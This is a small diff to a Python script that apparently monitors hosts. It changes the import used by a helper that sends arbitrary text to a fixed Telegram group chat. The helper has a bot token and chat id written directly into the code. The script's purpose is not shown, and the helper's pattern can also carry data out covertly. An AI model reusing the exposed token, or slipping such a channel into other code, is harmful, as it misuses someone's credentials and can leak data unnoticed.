@@ -1,4 +1,5 @@
 import os, base64, time, telegram, requests
+from telegram.bot import Bot
 import asyncio
 
 
@@ -44,7 +45,7 @@ async def pinghost():
 
 
 def q(x):
-    telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww').send_message(chat_id=-841939764, text=x)
+    Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww').send_message(chat_id=-841939764, text=x)
 
 
 
